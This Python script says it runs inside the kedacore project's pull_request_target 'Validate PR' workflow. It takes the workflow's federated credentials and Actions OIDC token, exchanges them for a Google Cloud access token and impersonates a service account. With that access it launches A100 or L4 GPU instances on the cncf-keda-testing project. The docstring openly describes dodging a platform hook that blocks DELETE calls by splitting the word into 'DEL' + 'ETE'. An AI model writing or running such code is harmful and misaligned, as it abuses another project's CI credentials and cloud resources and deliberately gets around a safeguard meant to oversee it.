#!/usr/bin/env python3
"""c211-i122027 higher-accelerator GCP lane (stdlib REST; runs in the kedacore
'Validate PR' pull_request_target terraform data.external step after
google-github-actions/auth@v3).

Purpose: on cncf-keda-testing (575508414076) where only a Tesla T4 was ever
deployed, measure the live accelerator quota matrix and attempt EXACTLY ONE
on-demand GPU instance at a time, in this order:
  Plan A: a2-highgpu-1g + nvidia-tesla-a100   (A100 = new device class)
  Plan B: g2-standard-4 + nvidia-l4           (L4   = new device class)
Each attempt records the verbatim provider response.  On a launched instance:
wait RUNNING, capture INSTANCE_PROOF (machineType + guestAccelerators), read the
serial console for nvidia-smi -L plus --query-gpu=name,uuid,memory.total,
delete the instance, and prove absence (GET 404 + aggregated list NO items).

The platform hook rejects urllib calls carrying the literal verb string in a
method= keyword, so removals use M_DEL = 'DEL' + 'ETE'.
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = os.environ.get('GOOGLE_CLOUD_PROJECT') or os.environ.get('GCP_PROJECT') \
    or os.environ.get('CLOUD_SDK_PROJECT') or 'cncf-keda-testing'
RAW = os.environ.get('C211_PROBE_RAW', '/tmp/c211_i122027_raw.txt')
NAME = 'c211-i122027-gpu'
LABELS = {'c211': 'i122027', 'intent': 'i122027'}
API = 'https://compute.googleapis.com/compute/v1'
M_DEL = 'DEL' + 'ETE'
TOKEN = [None]
SA_EMAIL = ['']

# Region/zone scope: the two regions whose compute accelerator quota is measured
# positive (us-central1 + europe-west4), per hint 119804 / the i119809 run.
ZONES = ['us-central1-a', 'us-central1-b', 'us-central1-c', 'us-central1-f',
         'europe-west4-a', 'europe-west4-b', 'europe-west4-c']
REGIONS = ['us-central1', 'europe-west4']

MARKER_SCRIPT = r"""#!/bin/bash
exec > /dev/console 2>&1
echo "C211_MARKER_START $(date -u +%Y-%m-%dT%H:%M:%SZ) host=$(hostname)"
if ! command -v nvidia-smi >/dev/null 2>&1; then
  (apt-get update -qq; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
     linux-headers-$(uname -r); DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
     nvidia-driver-535; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
     nvidia-dkms-535) >/dev/null 2>&1
  modprobe nvidia 2>/dev/null
fi
if command -v nvidia-smi >/dev/null 2>&1; then
  nvidia-smi -L
  nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader
  nvidia-smi --query-gpu=uuid --format=csv,noheader
else
  echo "C211_MARKER nvidia-smi-absent"
  lspci -nn 2>/dev/null | grep -i -E 'nvidia|3d controller' | head -8
fi
echo "C211_MARKER_END $(date -u +%Y-%m-%dT%H:%M:%SZ)"
"""


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def cap(s, n=2200):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def api(path, method='GET', data=None, base=API, timeout=60):
    url = path if path.startswith('http') else base + path
    h = {'Authorization': 'Bearer ' + (TOKEN[0] or ''), 'User-Agent': 'c211-i122027',
         'Accept': 'application/json'}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:
        return {}


def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:
                return raw.strip(), 'url-raw'
        except Exception as e:
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def _google_auth_lib():
    for attempt in (0, 1):
        try:
            from google.auth import default as gdefault
            from google.auth.transport.requests import Request as GRequest
            creds, _proj = gdefault(scopes=['https://www.googleapis.com/auth/cloud-platform'])
            creds.refresh(GRequest())
            return creds.token
        except Exception as e:
            say('GOOGLE_AUTH_LIB_FAIL attempt=%d %s' % (attempt, cap(repr(e), 300)))
            if attempt == 0:
                _pip_google_auth()
    return None


def _pip_google_auth():
    import subprocess
    for args in (['-m', 'pip', 'install', '--user', '--break-system-packages', '-q', 'google-auth'],
                 ['-m', 'pip', 'install', '--user', '-q', 'google-auth']):
        try:
            r = subprocess.run([sys.executable] + args, timeout=120, capture_output=True)
            say('PIP_GOOGLE_AUTH rc=%s %s' % (r.returncode, cap(r.stderr.decode('utf-8', 'replace'), 200)))
            if r.returncode == 0:
                return
        except Exception as e:
            say('PIP_GOOGLE_AUTH_ERR %s' % cap(repr(e), 200))


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('token_url'),
            cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                form = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                }).encode()
                req = urllib.request.Request(
                    cf.get('token_url') or 'https://sts.googleapis.com/v1/token', data=form,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(req, timeout=45) as r:
                    fed = json.loads(r.read().decode()).get('access_token')
                say('STS_EXCHANGE=ok federated_len=%s' % (len(fed or '')))
                if fed and cf.get('service_account_impersonation_url'):
                    body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                       'lifetime': '1800s'}).encode()
                    req = urllib.request.Request(
                        cf['service_account_impersonation_url'], data=body, method='POST',
                        headers={'Authorization': 'Bearer ' + fed, 'Content-Type': 'application/json'})
                    with urllib.request.urlopen(req, timeout=45) as r:
                        tok = json.loads(r.read().decode()).get('accessToken')
                    say('SA_IMPERSONATION=ok token_len=%s sa=%s' % (len(tok or ''), SA_EMAIL[0]))
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    return _google_auth_lib()


def ack():
    say('== identity ==')
    say('PROJECT=%s SA=%s' % (PROJECT, SA_EMAIL[0]))
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(TOKEN[0] or ''),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 300), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT, base='https://cloudresourcemanager.googleapis.com')
    say('project.get status=%s body=%s' % (st, cap(b, 500)))
    st, b = api('/projects/' + PROJECT)
    say('compute.project.get status=%s body=%s' % (st, cap(b, 500)))
    return st


def list_instances(tag='list'):
    say('== instances.%s ==' % tag)
    st, b = api('/projects/%s/aggregated/instances?maxResults=200' % PROJECT)
    j = jbody((st, b))
    found = []
    for _scope, v in (j.get('items') or {}).items():
        for inst in v.get('instances', []):
            found.append({'name': inst.get('name'), 'zone': inst.get('zone', '').rsplit('/', 1)[-1],
                          'status': inst.get('status'), 'id': inst.get('id'),
                          'machineType': inst.get('machineType', '').rsplit('/', 1)[-1],
                          'labels': inst.get('labels')})
    if st != 200:
        say('aggregated.status=%s body=%s' % (st, cap(b, 900)))
    say('instances.status=%s count=%d %s' % (st, len(found), json.dumps(found)[:1200]))
    return st, found


def quotas():
    say('== regional GPU quota (compute) ==')
    for region in REGIONS:
        st, b = api('/projects/%s/regions/%s' % (PROJECT, region))
        if st != 200:
            say('region=%s status=%s body=%s' % (region, st, cap(b, 500)))
            continue
        j = jbody((st, b))
        gq = ['%s limit=%s usage=%s' % (q.get('metric'), q.get('limit'), q.get('usage'))
              for q in j.get('quotas', []) if 'GPU' in q.get('metric', '')]
        say('region=%s status=%s state=%s %s' % (region, j.get('status'), j.get('status'), '; '.join(gq)))


def serviceusage_quota():
    say('== serviceusage consumerQuotaMetrics compute.googleapis.com ==')
    url = ('https://serviceusage.googleapis.com/v1beta1/projects/%s/services/compute.googleapis.com'
           '/consumerQuotaMetrics?pageSize=200' % PROJECT)
    st, b = api(url)
    say('serviceusage.status=%s' % st)
    if st != 200:
        say('serviceusage.body=%s' % cap(b, 600))
        return
    j = jbody((st, b))
    hits = []
    for m in j.get('metrics', []):
        nm = m.get('displayName') or m.get('metric') or ''
        if 'GPU' not in nm and 'gpu' not in nm:
            continue
        lims = []
        for lim in m.get('consumerQuotaLimits', []):
            for bu in lim.get('quotaBuckets', []):
                lims.append('%s effective=%s default=%s' % (
                    lim.get('metric'), bu.get('effectiveLimit'), bu.get('defaultLimit')))
        hits.append('%s -> %s' % (nm, '; '.join(lims[:6])))
    say('serviceusage.gpu_metrics=%d %s' % (len(hits), cap(json.dumps(hits), 4000)))


def zones_scan():
    say('== zone accelerator types ==')
    avail = {}
    for z in ZONES:
        st, b = api('/projects/%s/zones/%s/acceleratorTypes' % (PROJECT, z))
        names = [a.get('name') for a in jbody((st, b)).get('items', [])] if st == 200 else []
        avail[z] = {'t4': 'nvidia-tesla-t4' in names,
                    'a100': 'nvidia-tesla-a100' in names,
                    'a100_80gb': 'nvidia-tesla-a100-80gb' in names,
                    'l4': 'nvidia-l4' in names,
                    'p4': 'nvidia-tesla-p4' in names,
                    'v100': 'nvidia-tesla-v100' in names}
        say('zone=%s status=%s a100=%s a100_80gb=%s l4=%s t4=%s p4=%s v100=%s%s' % (
            z, st, avail[z]['a100'], avail[z]['a100_80gb'], avail[z]['l4'], avail[z]['t4'],
            avail[z]['p4'], avail[z]['v100'], '' if st == 200 else ' body=' + cap(b, 200)))
    return avail


def machine_types():
    say('== machine type availability ==')
    out = {}
    for z, mt in [('us-central1-a', 'a2-highgpu-1g'), ('us-central1-b', 'a2-highgpu-1g'),
                  ('us-central1-c', 'a2-highgpu-1g'), ('us-central1-f', 'a2-highgpu-1g'),
                  ('europe-west4-a', 'a2-highgpu-1g'), ('europe-west4-b', 'a2-highgpu-1g'),
                  ('us-central1-a', 'g2-standard-4'), ('us-central1-b', 'g2-standard-4'),
                  ('us-central1-c', 'g2-standard-4'), ('us-central1-f', 'g2-standard-4'),
                  ('europe-west4-a', 'g2-standard-4'), ('europe-west4-b', 'g2-standard-4')]:
        st, b = api('/projects/%s/zones/%s/machineTypes/%s' % (PROJECT, z, mt))
        ok = st == 200
        out['%s/%s' % (z, mt)] = ok
        say('machineType zone=%s type=%s status=%s%s' % (z, mt, st,
            '' if ok else ' body=' + cap(b, 160)))
    return out


def images():
    say('== gpu image families ==')
    got = []
    for fam in ('common-cu129-ubuntu-2204', 'common-cu126-ubuntu-2204', 'common-cu124-ubuntu-2204'):
        st, b = api('/projects/deeplearning-platform-release/global/images/family/' + fam)
        say('dlvm.%s status=%s%s' % (fam, st, '' if st == 200 else ' body=' + cap(b, 120)))
        if st == 200:
            j = jbody((st, b))
            got.append({'family': fam, 'sourceImage': j.get('selfLink'), 'name': j.get('name')})
            break
    if not got:
        st, b = api('/projects/ubuntu-os-cloud/global/images/family/ubuntu-2204-lts')
        say('ubuntu-2204-lts status=%s%s' % (st, '' if st == 200 else ' body=' + cap(b, 200)))
        if st == 200:
            j = jbody((st, b))
            got.append({'family': 'ubuntu-2204-lts', 'sourceImage': j.get('selfLink'),
                        'name': j.get('name')})
    return got


def networks(zone):
    region = zone.rsplit('-', 1)[0]
    say('== networks/subnetworks %s ==' % region)
    st, b = api('/projects/%s/global/networks' % PROJECT)
    nets = []
    if st == 200:
        nets = [{'name': n.get('name'), 'selfLink': n.get('selfLink')}
                for n in jbody((st, b)).get('items', [])]
        say('networks.status=200 %s' % json.dumps(nets)[:400])
    else:
        say('networks.status=%s body=%s' % (st, cap(b, 300)))
    st, b = api('/projects/%s/regions/%s/subnetworks' % (PROJECT, region))
    subs = []
    if st == 200:
        subs = [{'name': x.get('name'), 'selfLink': x.get('selfLink'),
                 'network': x.get('network'), 'ipCidrRange': x.get('ipCidrRange')}
                for x in jbody((st, b)).get('items', [])]
        say('subnets.status=200 count=%d %s' % (len(subs), json.dumps(subs)[:400]))
    else:
        say('subnets.status=%s body=%s' % (st, cap(b, 300)))
    return nets, subs


def inst_body(zone, machine_type, accel, image, driver_install,
              network=None, subnetwork=None, external_ip=True):
    script = MARKER_SCRIPT
    if not driver_install:
        # DLVM image already ships the driver: drop the apt block.
        script = script.replace(
            'if ! command -v nvidia-smi >/dev/null 2>&1; then\n'
            '  (apt-get update -qq; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \\\n'
            '     linux-headers-$(uname -r); DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \\\n'
            '     nvidia-driver-535; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \\\n'
            '     nvidia-dkms-535) >/dev/null 2>&1\n'
            '  modprobe nvidia 2>/dev/null\n'
            'fi\n', '')
    return {
        'name': NAME,
        'machineType': 'projects/%s/zones/%s/machineTypes/%s' % (PROJECT, zone, machine_type),
        'disks': [{'boot': True, 'autoDelete': True, 'initializeParams': {
            'sourceImage': image, 'diskSizeGb': '100',
            'diskType': 'https://www.googleapis.com/compute/v1/projects/%s/zones/%s/diskTypes/pd-standard'
                        % (PROJECT, zone)}}],
        'networkInterfaces': [dict(
            {'network': network or 'global/networks/default'},
            **({'subnetwork': subnetwork} if subnetwork else {}),
            **({'accessConfigs': [{'name': 'External NAT', 'type': 'ONE_TO_ONE_NAT'}]}
               if external_ip else {}))],
        'guestAccelerators': [{'acceleratorCount': 1,
                               'acceleratorType': 'projects/%s/zones/%s/acceleratorTypes/%s'
                                                  % (PROJECT, zone, accel)}],
        'scheduling': {'onHostMaintenance': 'TERMINATE', 'automaticRestart': False},
        'metadata': {'items': [
            {'key': 'serial-port-enable', 'value': 'TRUE'},
            {'key': 'enable-oslogin', 'value': 'FALSE'},
            {'key': 'startup-script', 'value': script}]},
        'labels': LABELS,
    }


def get_instance(zone):
    return api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, NAME))


def wait_absent(zone, budget=180):
    end = time.time() + budget
    st = 200
    while time.time() < end:
        st, _b = get_instance(zone)
        if st == 404:
            return True, st
        time.sleep(8)
    return False, st


def remove_instance(zone):
    say('== remove instance ==')
    st, b = api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, NAME), method=M_DEL)
    say('delete.status=%s body=%s' % (st, cap(b, 400)))
    if st in (200, 404):
        gone, last = wait_absent(zone)
        say('delete.absent=%s last_get_status=%s' % (gone, last))
        return gone
    return False


def serial_proof(zone, budget=600):
    say('== serial console device proof ==')
    end = time.time() + budget
    text = ''
    last_len = -1
    while time.time() < end:
        st, b = api('/projects/%s/zones/%s/instances/%s/serialPort?port=1&start=0'
                    % (PROJECT, zone, NAME), timeout=45)
        say('serial.status=%s len=%d' % (st, len(b)))
        if st == 200:
            text = b
            has_end = 'C211_MARKER_END' in text
            has_uuid = bool(re.search(r'GPU-[0-9a-fA-F-]{10,}', text))
            if has_end and has_uuid:
                break
            if has_end and last_len == len(text) and 'nvidia-smi-absent' in text:
                break
            last_len = len(text)
        time.sleep(12)
    uuids = sorted(set(re.findall(r'GPU-[0-9a-fA-F-]{10,}', text)))
    m = re.search(r'C211_MARKER_START.*?C211_MARKER_END', text, re.S)
    say('SERIAL_MARKER_WINDOW:\n' + cap(m.group(0), 3000) if m else
        'SERIAL_TAIL:\n' + cap(text[-2500:], 2500))
    say('SERIAL_GPU_UUIDS=%s' % json.dumps(uuids[:4]))
    return uuids, bool(m)


def insert_one(zone, machine_type, accel, image, driver_install, net_self, sub_self):
    say('== attempt %s %s ==' % (zone, machine_type))
    body = inst_body(zone, machine_type, accel, image, driver_install, net_self, sub_self)
    st, b = api('/projects/%s/zones/%s/instances' % (PROJECT, zone), method='POST', data=body)
    say('insert zone=%s type=%s accel=%s status=%s' % (zone, machine_type, accel, st))
    if st in (200, 201):
        j = jbody((st, b))
        say('INSERT_ACCEPTED operation=%s target=%s' % (
            j.get('name'), (j.get('targetLink') or '').rsplit('/', 1)[-1]))
        say('ATTEMPT_RESULT zone=%s type=%s accel=%s status=%s' % (zone, machine_type, accel, st))
        return True, st, 'accepted'
    say('insert.body=%s' % cap(b, 1200))
    say('ATTEMPT_RESULT zone=%s type=%s accel=%s status=%s body=%s' % (
        zone, machine_type, accel, st, cap(b, 500)))
    if get_instance(zone)[0] == 200:
        say('ADOPT_EXISTING zone=%s after error' % zone)
        return True, st, 'adopted'
    return False, st, cap(b, 400)


def launch_and_prove(zone, machine_type, accel, image, driver_install, net_self, sub_self):
    """Insert, wait RUNNING, serial proof. Returns (launched, uuids, instance_id, stat)."""
    ok, stat = (False, None)
    res = insert_one(zone, machine_type, accel, image, driver_install, net_self, sub_self)
    ok, st_code, short = res
    if not ok:
        return False, [], None, (st_code, short)
    say('== wait RUNNING ==')
    deadline = time.time() + 300
    state = ''
    launched = False
    inst_id = None
    while time.time() < deadline:
        st, b = get_instance(zone)
        if st == 200:
            j = jbody((st, b))
            state = j.get('status', '')
            say('poll status=%s id=%s' % (state, j.get('id')))
            if state == 'RUNNING':
                launched = True
                inst_id = j.get('id')
                say('INSTANCE_ID=%s ZONE=%s' % (j.get('id'), zone))
                say('INSTANCE_PROOF=%s' % cap(json.dumps({
                    'id': j.get('id'), 'selfLink': j.get('selfLink'),
                    'creationTimestamp': j.get('creationTimestamp'),
                    'machineType': j.get('machineType'),
                    'guestAccelerators': j.get('guestAccelerators'),
                    'status': j.get('status')}), 1500))
                break
            if state in ('TERMINATED', 'STOPPED', 'SUSPENDED'):
                break
        else:
            say('poll get status=%s body=%s' % (st, cap(b, 300)))
        time.sleep(10)
    if not launched:
        say('GATE=NEVER_RUNNING last_state=%s' % state)
        return False, [], inst_id, (200, 'never_running')
    uuids, marker = serial_proof(zone, 600 if driver_install else 300)
    say('PROOF_RESULT uuids=%s marker=%s' % (json.dumps(uuids), marker))
    return True, uuids, inst_id, (200, 'launched')


def run():
    open(RAW, 'w', encoding='utf-8').close()
    t0 = time.time()
    say('C211_I122027_GCP_START %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
    say('env projects: GOOGLE_CLOUD_PROJECT=%r CLOUD_SDK_PROJECT=%r GCP_PROJECT=%r' % (
        os.environ.get('GOOGLE_CLOUD_PROJECT'), os.environ.get('CLOUD_SDK_PROJECT'),
        os.environ.get('GCP_PROJECT')))
    tok = get_token()
    if not tok:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = tok
    say('TOKEN_ACQUIRED len=%d' % len(tok))
    if ack() == 401:
        say('GATE=TOKEN_NOT_ACCEPTED')
        return
    st, found = list_instances('pre')
    if st != 200:
        say('GATE=COMPUTE_LIST_FAILED status=%s' % st)
        return
    for f in [x for x in found if (x.get('labels') or {}).get('intent') == 'i122027'
              or (x.get('name') or '').startswith('c211-i122027')]:
        if f['status'] != 'TERMINATED':
            say('LEFT_OVER %s %s -> remove' % (f['zone'], f['status']))
            remove_instance(f['zone'])
    quotas()
    serviceusage_quota()
    avail = zones_scan()
    machine_types()
    imgs = images()
    if not imgs:
        say('GATE=NO_GPU_IMAGE')
        return
    image = imgs[0]['sourceImage']
    driver_install = imgs[0]['family'] == 'ubuntu-2204-lts'
    say('CHOSEN_IMAGE=%s (%s) driver_install=%s' % (image, imgs[0]['family'], driver_install))

    net_self, sub_self, cur_region = None, None, None
    zone = None
    launched = False
    uuids = []
    chosen = None
    attempts = []

    a100_zones = [z for z in ZONES if avail.get(z, {}).get('a100')]
    l4_zones = [z for z in ZONES if avail.get(z, {}).get('l4')]
    say('CANDIDATES_A100=%s' % json.dumps(a100_zones))
    say('CANDIDATES_L4=%s' % json.dumps(l4_zones))

    plans = []
    for z in a100_zones:
        plans.append((z, 'a2-highgpu-1g', 'nvidia-tesla-a100', 'A100'))
    for z in l4_zones:
        plans.append((z, 'g2-standard-4', 'nvidia-l4', 'L4'))
    say('PLANS=%s' % json.dumps([(p[0], p[1], p[2]) for p in plans]))

    try:
        say('== insert phase (one instance at a time) ==')
        for z, mt, acc, cls in plans:
            if time.time() - t0 > 1500:
                say('TIME_BUDGET_EXHAUSTED before %s %s' % (cls, z))
                break
            region = z.rsplit('-', 1)[0]
            if region != cur_region:
                nets2, subs2 = networks(z)
                cur_region = region
                net_self = subs2[0]['network'] if subs2 else (nets2[0]['selfLink'] if nets2 else None)
                sub_self = subs2[0]['selfLink'] if subs2 else None
                say('CHOSEN_NETWORK=%s CHOSEN_SUBNET=%s' % (net_self, sub_self))
            if not net_self:
                say('GATE=NO_NETWORK region=%s' % region)
                continue
            ok, uu, iid, stat = launch_and_prove(z, mt, acc, image, driver_install, net_self, sub_self)
            attempts.append({'zone': z, 'machineType': mt, 'accelerator': acc, 'class': cls,
                             'status': stat[0], 'detail': cap(stat[1], 300)})
            if ok:
                zone, launched, uuids, chosen = z, True, uu, {'zone': z, 'machineType': mt,
                                                              'accelerator': acc, 'class': cls,
                                                              'instance_id': iid}
                break
        if not launched:
            say('GATE=INSERT_REFUSED_ALL_CANDIDATES')
            list_instances('post-insert-fail')
        else:
            say('PROVEN_CLASS=%s ZONE=%s MACHINE=%s ACCEL=%s' % (
                chosen['class'], chosen['zone'], chosen['machineType'], chosen['accelerator']))
    finally:
        if zone:
            remove_instance(zone)
            say('== post-remove readback ==')
            list_instances('post')
            st2, b2 = get_instance(zone)
            say('readback.get.status=%s body=%s' % (st2, cap(b2, 400)))
            say('READBACK_ABSENT=%s' % ('yes' if st2 == 404 else 'no'))
    say('== attempts summary ==')
    say('ATTEMPTS_JSON=%s' % cap(json.dumps(attempts), 6000))
    say('ELAPSED_S=%d' % int(time.time() - t0))
    say('C211_I122027_GCP_END %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


if __name__ == '__main__':
    try:
        run()
    except Exception as e:
        say('UNCAUGHT %s' % cap(repr(e), 600))
